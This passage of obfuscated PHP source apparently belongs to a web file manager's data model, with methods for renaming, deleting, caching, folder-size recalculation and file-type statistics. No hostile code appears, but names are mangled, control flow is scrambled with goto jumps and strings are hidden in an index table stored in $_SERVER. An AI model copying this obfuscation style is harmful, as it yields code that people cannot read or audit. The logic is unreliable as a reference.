$this->field($Cß¢”ÔäÕ¦[2354])->where($c¯ˆÃ¬µĞ‡)->select(); $Fæ³èíë‘ = !1; $f¼Á‡¯òÂ = array($Bä…ÃËÃ‹); if ($eÔ·Ş­´±©) { $Fæ³èíë‘ = array_to_keyvalue($eÔ·Ş­´±©, $Cß¢”ÔäÕ¦[33], $Cß¢”ÔäÕ¦[419]); $Fæ³èíë‘ = array_remove_value($Fæ³èíë‘, $Cß¢”ÔäÕ¦[468]); $f¼Á‡¯òÂ = array_to_keyvalue($eÔ·Ş­´±©, $Cß¢”ÔäÕ¦[33], $Cß¢”ÔäÕ¦[369]); $f¼Á‡¯òÂ[] = $Bä…ÃËÃ‹; } } else { $Fæ³èíë‘ = array($c¥Ì†¯¦“Ğ[$Cß¢”ÔäÕ¦[419]]); $f¼Á‡¯òÂ = array($Bä…ÃËÃ‹); } return array($Cß¢”ÔäÕ¦[2351] => $f¼Á‡¯òÂ, $Cß¢”ÔäÕ¦[1261] => $Fæ³èíë‘); } public function removeArray($d¸Ø§äŠ®„) { if (!$d¸Ø§äŠ®„) { return !0; } } public function removeRelevance($fØ¢õ¹í©¨, $E¬í™˜¦‚ë) { goto fŸäœœÎÇ; fŸäœœÎÇ: $f×íˆÓÑÑ‚ =& $_SERVER[”Ì÷ñ­î¸]; $fØ¢õ¹í©¨ = $fØ¢õ¹í©¨ ? $fØ¢õ¹í©¨ : array(); $E¬í™˜¦‚ë = $E¬í™˜¦‚ë ? $E¬í™˜¦‚ë : array(); goto BÜ²ˆ²öÁÔ; Cƒ”…é»‹¥: Model($f×íˆÓÑÑ‚[2333])->removeBySource($fØ¢õ¹í©¨); $this->where($EˆÚÃ›³½)->delete(); Model($f×íˆÓÑÑ‚[422])->remove($E¬í™˜¦‚ë); goto eë™†ŸŠğ‘; A„¤¹ëÂ¥: Model($f×íˆÓÑÑ‚[2355])->where($EˆÚÃ›³½)->delete(); Model($f×íˆÓÑÑ‚[505])->where($EˆÚÃ›³½)->delete(); Model($f×íˆÓÑÑ‚[2083])->removeBySource($fØ¢õ¹í©¨); goto Cƒ”…é»‹¥; BÜ²ˆ²öÁÔ: $fØ¢õ¹í©¨ = array_unique(array_filter($fØ¢õ¹í©¨)); $E¬í™˜¦‚ë = array_unique(array_filter($E¬í™˜¦‚ë)); if (!$fØ¢õ¹í©¨) { return !1; } goto C½à´­õîÈ; eë™†ŸŠğ‘: for ($E¬Ú–» © = 0; $E¬Ú–» © < count($fØ¢õ¹í©¨); $E¬Ú–» ©++) { $this->sourceCacheClear($fØ¢õ¹í©¨[$E¬Ú–» ©]); } goto d­ïß†ƒá; C½à´­õîÈ: $EˆÚÃ›³½ = array($f×íˆÓÑÑ‚[383] => array($f×íˆÓÑÑ‚[384], $fØ¢õ¹í©¨)); Model($f×íˆÓÑÑ‚[2352])->where($EˆÚÃ›³½)->delete(); Model($f×íˆÓÑÑ‚[413])->where($EˆÚÃ›³½)->delete(); goto A„¤¹ëÂ¥; d­ïß†ƒá: } public function rename($eËÂÚáª¼Á, $eÛĞ“‡æÜ‰) { goto CĞÇèõ‰Ë; bÈ…è±áù–: $aáÙì«ƒ†° = $this->fileNameExist($FåÄ…”ƒ–[$d¿ê¶šˆÈÁ[461]], $eÛĞ“‡æÜ‰); if ($aáÙì«ƒ†°) { return !1; } $Dñš©ˆ²•ğ = array($d¿ê¶šˆÈÁ[386] => $eÛĞ“‡æÜ‰, $d¿ê¶šˆÈÁ[524] => USER_ID); goto BÉè¦÷Ã‰…; CĞÇèõ‰Ë: $d¿ê¶šˆÈÁ =& $_SERVER[”Ì÷ñ­î¸]; $FåÄ…”ƒ– = $this->sourceInfo($eËÂÚáª¼Á); if (!$FåÄ…”ƒ–) { return !1; } goto bÈ…è±áù–; B´«ô÷š²: $fé©ïôáÑ = $d¿ê¶šˆÈÁ[2341] . $FåÄ…”ƒ–[$d¿ê¶šˆÈÁ[461]]; if (isset(self::$cacheChildList[$fé©ïôáÑ])) { unset(self::$cacheChildList[$fé©ïôáÑ]); } return $e…ÍÌŸ‘; goto AùÊ’›‡îî; BÉè¦÷Ã‰…: if (!$FåÄ…”ƒ–[$d¿ê¶šˆÈÁ[370]] == $d¿ê¶šˆÈÁ[83]) { $Dñš©ˆ²•ğ[$d¿ê¶šˆÈÁ[372]] = get_path_ext($eÛĞ“‡æÜ‰); } Model($d¿ê¶šˆÈÁ[505])->eventRename($eËÂÚáª¼Á, $FåÄ…”ƒ–[$d¿ê¶šˆÈÁ[28]], $eÛĞ“‡æÜ‰); $this->sourceCacheClear($eËÂÚáª¼Á); goto AîçİÒïÇæ; AîçİÒïÇæ: $this->setNamePinyin($eËÂÚáª¼Á, $Dñš©ˆ²•ğ[$d¿ê¶šˆÈÁ[28]], !1); $this->updateModifyTime($FåÄ…”ƒ–[$d¿ê¶šˆÈÁ[461]]); $e…ÍÌŸ‘ = $this->where(array($d¿ê¶šˆÈÁ[383] => $eËÂÚáª¼Á))->data($Dñš©ˆ²•ğ)->save(); goto B´«ô÷š²; AùÊ’›‡îî: } public function setNamePinyin($c¬¨ó³ÚÉ·, $EïŒå®Êï†, $B‡ ˆ×§ÓÌ = true) { $D„£¬“ÍÒ‹ =& $_SERVER[”Ì÷ñ­î¸]; $F‹ÊÚ¢Ê = Input::check($EïŒå®Êï†, $D„£¬“ÍÒ‹[528]); if ($B‡ ˆ×§ÓÌ && !$F‹ÊÚ¢Ê) { return; } if (!$F‹ÊÚ¢Ê) { $this->metaSet($c¬¨ó³ÚÉ·, $D„£¬“ÍÒ‹[416], null); $this->metaSet($c¬¨ó³ÚÉ·, $D„£¬“ÍÒ‹[415], null); return; } $b×ˆÁ‹Êà = array($D„£¬“ÍÒ‹[416] => str_replace($D„£¬“ÍÒ‹[50], $D„£¬“ÍÒ‹[33], Pinyin::encode($EïŒå®Êï†)), $D„£¬“ÍÒ‹[415] => Pinyin::encode($EïŒå®Êï†, $D„£¬“ÍÒ‹[529])); $this->metaSet($c¬¨ó³ÚÉ·, $b×ˆÁ‹Êà); } public function getContent($d«ˆîìøòê) { goto e›áÎ…£Ç·; e›áÎ…£Ç·: $c†«Õ®À‘É =& $_SERVER[”Ì÷ñ­î¸]; $eÙÊÄŸã’Ä = $this->fileInfoGet($d«ˆîìøòê); if (!$eÙÊÄŸã’Ä) { return !1; } goto D…‚ñ»°š; D…‚ñ»°š: if ($eÙÊÄŸã’Ä[$c†«Õ®À‘É[77]] == 0) { return $c†«Õ®À‘É[33]; } $D°™­Ê¦ÜŸ = $c†«Õ®À‘É[2356] . $eÙÊÄŸã’Ä[$c†«Õ®À‘É[163]]; if ($eÙÊÄŸã’Ä[$c†«Õ®À‘É[77]] <= 1024 * 10) { $dïİ¾¹œ‹Ø = Cache::get($D°™­Ê¦ÜŸ); if (!$dïİ¾¹œ‹Ø) { $dïİ¾¹œ‹Ø = IO::getContent($eÙÊÄŸã’Ä[$c†«Õ®À‘É[75]]); Cache::set($D°™­Ê¦ÜŸ, $dïİ¾¹œ‹Ø); } return $dïİ¾¹œ‹Ø; } goto fÄİ¾Õßº; fÄİ¾Õßº: return IO::getContent($eÙÊÄŸã’Ä[$c†«Õ®À‘É[75]]); goto c÷ôæÙç¢ˆ; c÷ôæÙç¢ˆ: } public function setDesc($aáŠÇÔî­, $CøòÄ–ÖÄ·) { $Dñéë–š =& $_SERVER[”Ì÷ñ­î¸]; Model($Dñéë–š[505])->eventAddDesc($aáŠÇÔî­, $CøòÄ–ÖÄ·); return $this->metaSet($aáŠÇÔî­, $Dñéë–š[405], $CøòÄ–ÖÄ·); } public function setContent($FÆÄÑµíÚ, $eğî›¥¡Œê = '') { goto e¶‰’†êˆœ; e¢ç¤«Ù¾: if (!$BÚ¡™‘œÉå || !$d©ÚÓ½ÛÒ) { return !1; } $DÀ¡îÃ–º = Model($FëçµãÚ­×[422])->addFileByContent($eğî›¥¡Œê, $d©ÚÓ½ÛÒ[$FëçµãÚ­×[28]]); $F°ğÙÕ‰œ = $this->fileHistory($d©ÚÓ½ÛÒ, $DÀ¡îÃ–º[$FëçµãÚ­×[419]], $DÀ¡îÃ–º[$FëçµãÚ­×[77]]); goto b£êè·ĞÜ; b£êè·ĞÜ: if (!$F°ğÙÕ‰œ) { return Model($FëçµãÚ­×[422])->remove($DÀ¡îÃ–º[$FëçµãÚ­×[419]]); } $this->folderSizeReset($d©ÚÓ½ÛÒ[$FëçµãÚ­×[461]]); return !0; goto f°›‚’ÛË; e¶‰’†êˆœ: $FëçµãÚ­× =& $_SERVER[”Ì÷ñ­î¸]; $d©ÚÓ½ÛÒ = $this->sourceInfo($FÆÄÑµíÚ); $BÚ¡™‘œÉå = $this->fileInfoGet($FÆÄÑµíÚ); goto e¢ç¤«Ù¾; f°›‚’ÛË: } public function fileSubstr($Aá±Ší²Í‡, $E†¾ƒ™ïƒ¬, $EÂ£·›çø…) { $bĞ ¦«‹• = $this->fileInfoGet($Aá±Ší²Í‡); if (!$bĞ ¦«‹•) { return !1; } return IO::fileSubstr($bĞ ¦«‹•[$_SERVER[”Ì÷ñ­î¸][75]], $E†¾ƒ™ïƒ¬, $EÂ£·›çø…); } public function fileInfoGet($AŒô¡ö¡Ë) { goto CíÎË«ä©; A—¹·³Ó‘: $CØö¿ï¡ù® = Model($d®ë¸ã»ÍÁ[422])->fileInfo($cæÍÒÚÕˆ÷[$d®ë¸ã»ÍÁ[419]]); if ($CØö¿ï¡ù®) { $CØö¿ï¡ù®[$d®ë¸ã»ÍÁ[28]] = $cæÍÒÚÕˆ÷[$d®ë¸ã»ÍÁ[28]]; } self::$cacheFileInfo[$aÙ…Û¹—•à] = $CØö¿ï¡ù®; goto b³»£ö¯ùõ; CíÎË«ä©: $d®ë¸ã»ÍÁ =& $_SERVER[”Ì÷ñ­î¸]; $cæÍÒÚÕˆ÷ = $this->sourceInfo($AŒô¡ö¡Ë); if (!$cæÍÒÚÕˆ÷ || $cæÍÒÚÕˆ÷[$d®ë¸ã»ÍÁ[370]]) { return !1; } goto fÌÛÈÀ™ƒô; fÌÛÈÀ™ƒô: $aÙ…Û¹—•à = $d®ë¸ã»ÍÁ[425] . $cæÍÒÚÕˆ÷[$d®ë¸ã»ÍÁ[419]]; $D· šµÆ… = _get(self::$cacheFileInfo, $aÙ…Û¹—•à); if ($D· šµÆ…) { return $D· šµÆ…; } goto A—¹·³Ó‘; b³»£ö¯ùõ: return $CØö¿ï¡ù®; goto Cäòòóªİ; Cäòòóªİ: } private function folderChildrenNumber($eœÏõª¤‹¨) { $d£íÑ‹ßÛ =& $_SERVER[”Ì÷ñ­î¸]; $aæ¾¼˜–ù¥ = $this->sourceInfo($eœÏõª¤‹¨); $C“ªæ²³Ø = array($d£íÑ‹ßÛ[525] => array($d£íÑ‹ßÛ[483], $aæ¾¼˜–ù¥[$d£íÑ‹ßÛ[459]] . $eœÏõª¤‹¨ . $d£íÑ‹ßÛ[484]), $d£íÑ‹ßÛ[396] => intval($aæ¾¼˜–ù¥[$d£íÑ‹ßÛ[397]]), $d£íÑ‹ßÛ[518] => 1); $Aƒ´ˆÍ»™ = $this->where($C“ªæ²³Ø)->count(); $Aùµ¤È†Ğ¹ = $this->where($C“ªæ²³Ø)->where(array($d£íÑ‹ßÛ[518] => 0))->count(); return array($d£íÑ‹ßÛ[81] => $Aùµ¤È†Ğ¹, $d£íÑ‹ßÛ[82] => $Aƒ´ˆÍ»™); } public function pathInfo($føø²ß÷ÈÅ, $cöÜØÆÅ© = false) { goto bŒ¾œÜ÷Š; B„§Šó½‰: if ($D±³ÌÛô¦†) { return $D±³ÌÛô¦†; } $e„Äšù¢ƒÎ = $this->sourceInfo($føø²ß÷ÈÅ); if (!$e„Äšù¢ƒÎ) { return !1; } goto e¯ëöğãƒ¨; e¯ëöğãƒ¨: $e„Äšù¢ƒÎ = $this->_listDataApplyItem($e„Äšù¢ƒÎ, $cöÜØÆÅ©); self::$cachePathInfo[$cŒ«ëªÔ„½] = $e„Äšù¢ƒÎ; return $e„Äšù¢ƒÎ; goto fùÜÂ¦“Ë; bŒ¾œÜ÷Š: $c×îÃÛµÌˆ =& $_SERVER[”Ì÷ñ­î¸]; $cŒ«ëªÔ„½ = $c×îÃÛµÌˆ[411] . intval($cöÜØÆÅ©) . $c×îÃÛµÌˆ[412] . $føø²ß÷ÈÅ; $D±³ÌÛô¦† = _get(self::$cachePathInfo, $cŒ«ëªÔ„½); goto B„§Šó½‰; fùÜÂ¦“Ë: } public static $cachePathInfoMore = array(); public function pathInfoMore($aèîù‰í¹) { goto bÁšŒÅ×ÎË; cïÀ¾­‡ğ§: self::$cachePathInfoMore[$aèîù‰í¹] = $cŠÆá£‚Ö; return $cŠÆá£‚Ö; goto EééŸÉÀˆ; CÀÜœŒçÆº: $cŠÆá£‚Ö = $this->pathInfo($aèîù‰í¹); if (!$cŠÆá£‚Ö) { return !1; } if ($cŠÆá£‚Ö[$f²¦½ïÁÙ[370]] == $f²¦½ïÁÙ[83]) { $cŠÆá£‚Ö[$f²¦½ïÁÙ[80]] = $this->folderChildrenNumber($aèîù‰í¹); } goto cïÀ¾­‡ğ§; bÁšŒÅ×ÎË: $f²¦½ïÁÙ =& $_SERVER[”Ì÷ñ­î¸]; $A­Ó‹ÛÈˆ = _get(self::$cachePathInfoMore, $aèîù‰í¹); if ($A­Ó‹ÛÈˆ) { return $A­Ó‹ÛÈˆ; } goto CÀÜœŒçÆº; EééŸÉÀˆ: } public function sourceInfo($Fƒ»Ä¸è÷Š) { goto aâŸ¼ÉíøÎ; EÏÜ¦£¨Ğö: self::$cacheSourceInfo[$eì×¼»ôå] = $f­†°¦ñº; return self::$cacheSourceInfo[$eì×¼»ôå]; goto BÏã´·èß; aâŸ¼ÉíøÎ: $aÔê«¦ =& $_SERVER[”Ì÷ñ­î¸]; if (!$Fƒ»Ä¸è÷Š) { return array(); } $eì×¼»ôå = $aÔê«¦[410] . $Fƒ»Ä¸è÷Š; goto a°öÈÏ“«ì; a°öÈÏ“«ì: $EÎ°šªîƒÏ = _get(self::$cacheSourceInfo, $eì×¼»ôå); if ($EÎ°šªîƒÏ) { return $EÎ°šªîƒÏ; } $f­†°¦ñº = $this->where(array($aÔê«¦[369] => $Fƒ»Ä¸è÷Š))->find(); goto EÏÜ¦£¨Ğö; BÏã´·èß: } public function sourceCacheClear($dœ•—ÓªÍ = false) { if ($dœ•—ÓªÍ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[”Ì÷ñ­î¸][410] . $dœ•—ÓªÍ]); } public function pathInfoByPath($b‰¦š›‡çµ, $bšËšŸõøå) { $a²‘¬©Î†­ =& $_SERVER[”Ì÷ñ­î¸]; $C„×÷ß¹° = !$bšËšŸõøå ? array() : explode($a²‘¬©Î†­[8], trim($bšËšŸõøå, $a²‘¬©Î†­[8])); $eÄòÍÁøÅÎ = $b‰¦š›‡çµ; foreach ($C„×÷ß¹° as $E•¤ĞŸÀÛŸ) { $Eâ¾‹à¹‰½ = array($a²‘¬©Î†­[461] => $eÄòÍÁøÅÎ, $a²‘¬©Î†­[28] => $E•¤ĞŸÀÛŸ); $eŞù‚‰Š“ = $this->where($Eâ¾‹à¹‰½)->select(); if (!$eŞù‚‰Š“) { return !1; } $eŞù‚‰Š“ = array_sort_by($eŞù‚‰Š“, $a²‘¬©Î†­[397]); $eÄòÍÁøÅÎ = $eŞù‚‰Š“[0][$a²‘¬©Î†­[369]]; } return $this->pathInfo($eÄòÍÁøÅÎ, !0); } protected function updateModifyTime($Dá¨ù¹¿åÕ) { goto d‰âÛé±™õ; dæâÒëÀ»: $this->where($d»À§ŒÊ¶Ë)->save($Dˆ¢Ê¥Àô”); goto FÚ¬÷íº§¤; D×ƒè´êİÎ: foreach ($Dá¨ù¹¿åÕ as $E›œòÀÙ± => $a‚¾ÜÏîË) { $Dá¨ù¹¿åÕ[$E›œòÀÙ±] = intval($a‚¾ÜÏîË); } $d»À§ŒÊ¶Ë = array($e Ú…¦„”[369] => array($e Ú…¦„”[7], $Dá¨ù¹¿åÕ)); $Dˆ¢Ê¥Àô” = array($e Ú…¦„”[524] => USER_ID, $e Ú…¦„”[390] => time()); goto dæâÒëÀ»; d‰âÛé±™õ: $e Ú…¦„” =& $_SERVER[”Ì÷ñ­î¸]; if (!$Dá¨ù¹¿åÕ) { return; } if (!is_array($Dá¨ù¹¿åÕ)) { $Dá¨ù¹¿åÕ = array($Dá¨ù¹¿åÕ); } goto D×ƒè´êİÎ; FÚ¬÷íº§¤: } public function folderSizeReset($FòáâÈ´À‘) { goto fŒÇˆÚ•é; b·ç²ó‘­²: CacheLock::unlock($E—®Ã¡ìÂ‹); goto e‘ÊÃ§‡; c°ÌÅÕó‰Ô: CacheLock::lock($E—®Ã¡ìÂ‹, 20); $this->sourceCacheClear($FòáâÈ´À‘); $Dêòù­óİ‹ = $this->sourceInfo($FòáâÈ´À‘); goto Fõéš«µ†; eœùÅŞÑùò: $dÏ’½Ë§² = $this->parentLevelArray($Dêòù­óİ‹[$e°¿©õ­§[459]]); if ($dÏ’½Ë§²) { $d¯ÍŒÇÇ† = array($e°¿©õ­§[369] => array($e°¿©õ­§[384], $dÏ’½Ë§²)); if ($E¼Â‹ìÈ…ô < 0) { $d¯ÍŒÇÇ†[$e°¿©õ­§[77]] = array($e°¿©õ­§[931], abs($E¼Â‹ìÈ…ô)); } $this->where($d¯ÍŒÇÇ†)->setAdd($e°¿©õ­§[77], $E¼Â‹ìÈ…ô); } $this->targetSpaceUpdate($Dêòù­óİ‹[$e°¿©õ­§[371]], $Dêòù­óİ‹[$e°¿©õ­§[456]]); goto b·ç²ó‘­²; Fõéš«µ†: $d¯ÍŒÇÇ† = array($e°¿©õ­§[368] => $FòáâÈ´À‘, $e°¿©õ­§[396] => 0); $Cˆ„Ö†…« = $this->where($d¯ÍŒÇÇ†)->sum($e°¿©õ­§[77]); $Cˆ„Ö†…« = intval($Cˆ„Ö†…«); goto bÛÙ…ŸÍù†; bÛÙ…ŸÍù†: $E¼Â‹ìÈ…ô = $Cˆ„Ö†…« - intval($Dêòù­óİ‹[$e°¿©õ­§[77]]); if ($E¼Â‹ìÈ…ô == 0) { return CacheLock::unlock($E—®Ã¡ìÂ‹); } $this->where(array($e°¿©õ­§[383] => $FòáâÈ´À‘))->setField($e°¿©õ­§[77], $Cˆ„Ö†…«); goto eœùÅŞÑùò; fŒÇˆÚ•é: $e°¿©õ­§ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->statusIgnoreResetSpace) { return; } $E—®Ã¡ìÂ‹ = $e°¿©õ­§[2357] . $FòáâÈ´À‘; goto c°ÌÅÕó‰Ô; e‘ÊÃ§‡: } public function folderSizeResetChildren($aÊÍ¾ÛÊŒÍ) { goto cñ’•‡¡Â; cñ’•‡¡Â: $f†Æä«„ =& $_SERVER[”Ì÷ñ­î¸]; $this->sourceCacheClear($aÊÍ¾ÛÊŒÍ); $cÈ³Ï£š’ = $this->sourceInfo($aÊÍ¾ÛÊŒÍ); goto AæÉ¹ë Ê; C“×½ìŞƒî: $E¬¿º¯‘³§[$f†Æä«„[370]] = 0; $bÙ©††‡Àä = $this->field($BšíÌ·öê)->where($E¬¿º¯‘³§)->select(); if (!$bÙ©††‡Àä) { return; } goto Eˆğ¶á‰á”; EØŠŒÒ‰ó‡: foreach ($bÙ©††‡Àä as $f–­ÓÎİ˜¨) { $Dç®Èä‚Ç” = $f–­ÓÎİ˜¨[$f†Æä«„[461]] . $f†Æä«„[33]; if (!isset($fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”])) { continue; } if ($f–­ÓÎİ˜¨[$f†Æä«„[397]] == $fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”][$f†Æä«„[397]]) { $fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”][$f†Æä«„[77]] += $f–­ÓÎİ˜¨[$f†Æä«„[77]]; } } foreach ($fÚÑ×Ò‚¾× as $f–­ÓÎİ˜¨) { $bªÙĞÆ¾º„ = $this->parentLevelArray($f–­ÓÎİ˜¨[$f†Æä«„[459]]); foreach ($bªÙĞÆ¾º„ as $Dç®Èä‚Ç”) { $Dç®Èä‚Ç” = $Dç®Èä‚Ç” . $f†Æä«„[33]; if (!isset($fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”])) { continue; } if ($f–­ÓÎİ˜¨[$f†Æä«„[397]] == $fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”][$f†Æä«„[397]]) { $fÚÑ×Ò‚¾×[$Dç®Èä‚Ç”][$f†Æä«„[77]] += $f–­ÓÎİ˜¨[$f†Æä«„[77]]; } } } $f’„ÍÖ–Ÿ = array(); goto D…Ñ§ƒ†·à; AæÉ¹ë Ê: $E¬¿º¯‘³§ = array($f†Æä«„[518] => 1, $f†Æä«„[525] => array($f†Æä«„[483], $cÈ³Ï£š’[$f†Æä«„[459]] . $aÊÍ¾ÛÊŒÍ . $f†Æä«„[484])); $BšíÌ·öê = $f†Æä«„[2358]; $fÚÑ×Ò‚¾× = $this->field($BšíÌ·öê)->where($E¬¿º¯‘³§)->select(); goto C“×½ìŞƒî; Eˆğ¶á‰á”: $fÚÑ×Ò‚¾×[] = $cÈ³Ï£š’; $fÚÑ×Ò‚¾× = array_to_keyvalue($fÚÑ×Ò‚¾×, $f†Æä«„[369]); foreach ($fÚÑ×Ò‚¾× as $BëîÎôìğÅ => $f–­ÓÎİ˜¨) { $fÚÑ×Ò‚¾×[$BëîÎôìğÅ][$f†Æä«„[2359]] = $fÚÑ×Ò‚¾×[$BëîÎôìğÅ][$f†Æä«„[77]]; $fÚÑ×Ò‚¾×[$BëîÎôìğÅ][$f†Æä«„[77]] = 0; } goto EØŠŒÒ‰ó‡; D…Ñ§ƒ†·à: foreach ($fÚÑ×Ò‚¾× as $f–­ÓÎİ˜¨) { if ($f–­ÓÎİ˜¨[$f†Æä«„[77]] == $f–­ÓÎİ˜¨[$f†Æä«„[2359]]) { continue; } $f’„ÍÖ–Ÿ[] = array($f†Æä«„[369], $f–­ÓÎİ˜¨[$f†Æä«„[369]], $f†Æä«„[77], $f–­ÓÎİ˜¨[$f†Æä«„[77]]); } $this->saveAll($f’„ÍÖ–Ÿ); goto c˜¬¤’ƒ•; c˜¬¤’ƒ•: } public function userSpaceReset($CÓ‹¶Ÿ†õ = false) { $c¹¡¿ùë»‡ =& $_SERVER[”Ì÷ñ­î¸]; $E©ÉŒ›®¬‡ = $this->where(array($c¹¡¿ùë»‡[371] => self::TYPE_USER, $c¹¡¿ùë»‡[456] => $CÓ‹¶Ÿ†õ, $c¹¡¿ùë»‡[370] => 0))->sum($c¹¡¿ùë»‡[77]); Model($c¹¡¿ùë»‡[474])->userEdit($CÓ‹¶Ÿ†õ, array($c¹¡¿ùë»‡[2092] => $E©ÉŒ›®¬‡)); } public function targetSpaceUpdate($a¾±¯í¡èÖ, $DŒ§ÍŒÛù ) { $bÃãÁñ¯í¾ =& $_SERVER[”Ì÷ñ­î¸]; if (!$DŒ§ÍŒÛù ) { return; } if (!in_array($a¾±¯í¡èÖ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $DÓä÷ŸŒ„÷ = $this->targetSpaceSize($a¾±¯í¡èÖ, $DŒ§ÍŒÛù ); if ($a¾±¯í¡èÖ == self::TYPE_USER) { Model($bÃãÁñ¯í¾[474])->userEdit($DŒ§ÍŒÛù , array($bÃãÁñ¯í¾[2092] => $DÓä÷ŸŒ„÷)); } else { if ($a¾±¯í¡èÖ == self::TYPE_GROUP) { Model($bÃãÁñ¯í¾[458])->groupEdit($DŒ§ÍŒÛù , array($bÃãÁñ¯í¾[2092] => $DÓä÷ŸŒ„÷)); } } } public function targetSpaceSize($dõ‹à’‰ô, $F‹ˆ¯í»·) { goto B«¦ÌİùÕ¢; B«¦ÌİùÕ¢: $fåãÀš¤ =& $_SERVER[”Ì÷ñ­î¸]; $cÄÍÆİâ = $this->sourceRoot($dõ‹à’‰ô, $F‹ˆ¯í»·, !0); if (!$cÄÍÆİâ) { return 0; } goto c˜›Ñğ†‹; C§¹£Ò¹Í´: $FïĞŸ‚® = array_to_keyvalue($FïĞŸ‚®, $fåãÀš¤[33], $fåãÀš¤[369]); $FïĞŸ‚® = array_unique(array_filter($FïĞŸ‚®)); if ($FïĞŸ‚®) { $C§ùõÜ„˜¼ = array($fåãÀš¤[383] => array($fåãÀš¤[384], $FïĞŸ‚®)); $a™Æ¾²ÔùÓ += floatval($this->where($C§ùõÜ„˜¼)->sum($fåãÀš¤[77])); } goto Eêƒåªœ£; c˜›Ñğ†‹: $a™Æ¾²ÔùÓ = floatval($cÄÍÆİâ[$fåãÀš¤[77]]); $C§ùõÜ„˜¼ = array($fåãÀš¤[525] => array($fåãÀš¤[483], $fåãÀš¤[470] . $cÄÍÆİâ[$fåãÀš¤[369]] . $fåãÀš¤[484])); $FïĞŸ‚® = Model($fåãÀš¤[395])->field($fåãÀš¤[383])->where($C§ùõÜ„˜¼)->select(); goto C§¹£Ò¹Í´; Eêƒåªœ£: return $a™Æ¾²ÔùÓ; goto fà³ùù—ùÏ; fà³ùù—ùÏ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($bË—³ºÃ¯Ó) { return $this->fileTypeProfile($bË—³ºÃ¯Ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E‚Ğ½¥¥›×) { return $this->fileTypeProfile($E‚Ğ½¥¥›×, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c«‰ÜÏ¥ê, $F¸§îôåÕ) { goto dÅ‚Å‚«àÁ; bÖíÜãÆé¯: $CÕƒå°«»… = array(); $CÕƒå°«»…[$D‹–¡íÖ¹‹[2361]] = array($D‹–¡íÖ¹‹[2362] => LNG($D‹–¡íÖ¹‹[2361]), $D‹–¡íÖ¹‹[2363] => $this->where($C¥˜£„¸Üã)->count(), $D‹–¡íÖ¹‹[520] => $this->where($C¥˜£„¸Üã)->sum($D‹–¡íÖ¹‹[77])); $D®Ä… Á†ç = KodIO::fileTypeList(); goto c–§•ßÎàê; cù²Ñ¤ÑÁœ: if ($f›æ–ŞÌÕï) { return $f›æ–ŞÌÕï; } $C¥˜£„¸Üã = array($D‹–¡íÖ¹‹[518] => 0); if ($c«‰ÜÏ¥ê != !1) { $C¥˜£„¸Üã[$D‹–¡íÖ¹‹[456]] = $c«‰ÜÏ¥ê; $C¥˜£„¸Üã[$D‹–¡íÖ¹‹[371]] = $F¸§îôåÕ; } goto bÖíÜãÆé¯; c–§•ßÎàê: foreach ($D®Ä… Á†ç as $e‰éÂªß°Ï => $c‚ô¦óòà) { $C¥˜£„¸Üã[$D‹–¡íÖ¹‹[372]] = $this->fileTypeWhere($e‰éÂªß°Ï); $CÕƒå°«»…[$e‰éÂªß°Ï] = array($D‹–¡íÖ¹‹[2362] => $c‚ô¦óòà[$D‹–¡íÖ¹‹[28]], $D‹–¡íÖ¹‹[2363] => $this->where($C¥˜£„¸Üã)->count(), $D‹–¡íÖ¹‹[520] => $this->where($C¥˜£„¸Üã)->sum($D‹–¡íÖ¹‹[77])); } Cache::set($a•ÔŒ‹ª»¨, $CÕƒå°«»…, 1200); return $CÕƒå°«»…; goto cœÚ·¼øê; dÅ‚Å‚«àÁ: $D‹–¡íÖ¹‹ =& $_SERVER[”Ì÷ñ­î¸]; $a•ÔŒ‹ª»¨ = $D‹–¡íÖ¹‹[2360] . $c«‰ÜÏ¥ê . $D‹–¡íÖ¹‹[70] . $F¸§îôåÕ; $f›æ–ŞÌÕï = Cache::get($a•ÔŒ‹ª»¨); goto cù²Ñ¤ÑÁœ; cœÚ·¼øê: } public function fileNameExist($a¯õç¢Ş±, $b˜²‹î°³­) { $fÉ“¼òœë‚ =& $_SERVER[”Ì÷ñ­î¸]; $DªÃÓŠáˆ = $this->childList($a¯õç¢Ş±); foreach ($DªÃÓŠáˆ as $fêÓß„¤ñ¢) { if ($fêÓß„¤ñ¢[$fÉ“¼òœë‚[28]] == $b˜²‹î°³­) { return $fêÓß„¤ñ¢[$fÉ“¼òœë‚[369]]; } } return !1; } public function childList($Eô‘Í¼ä) { goto bÁ¢¦ï©Û; aô‚¥”ß: $dÙÉñóóä = array($aÁ œ‰öÀ–[461] => intval($Eô‘Í¼ä), $aÁ œ‰öÀ–[397] => 0); $BØèºÌ©¯ = $this->where($dÙÉñóóä)->select(); $BØèºÌ©¯ = $BØèºÌ©¯ ? $BØèºÌ©¯ : array(); goto fË©­éÑÜ; bÁ¢¦ï©Û: $aÁ œ‰öÀ– =& $_SERVER[”Ì÷ñ­î¸]; $BÉ‚œóÅº‰ = $aÁ œ‰öÀ–[2341] . $Eô‘Í¼ä; if (isset(self::$cacheChildList[$BÉ‚œóÅº‰])) { return self::$cacheChildList[$BÉ‚œóÅº‰]; } goto aô‚¥”ß; fË©­éÑÜ: self::$cacheChildList[$BÉ‚œóÅº‰] = $BØèºÌ©¯; foreach ($BØèºÌ©¯ as $cËÀÛªˆã) { $BÉ‚œóÅº‰ = $aÁ œ‰öÀ–[410] . $cËÀÛªˆã[$aÁ œ‰öÀ–[369]]; self::$cacheSourceInfo[$BÉ‚œóÅº‰] = $cËÀÛªˆã; } return $BØèºÌ©¯; goto D‘¬»İÂôœ; D‘¬»İÂôœ: } public function fileNameAuto($e—À— êá, $ağãç¬ÔÖŸ, $AæšÍÈïÆî = REPEAT_RENAME, $bĞ†–…µÂ¯ = false) { $fœÊï¤È¨á =& $_SERVER[”Ì÷ñ­î¸]; $fòâ‰àáò = $this->childList($e—À— êá); $a÷’¶À÷ŒÈ = array_to_keyvalue($fòâ‰àáò, $fœÊï¤È¨á[33], $fœÊï¤È¨á[28]); return 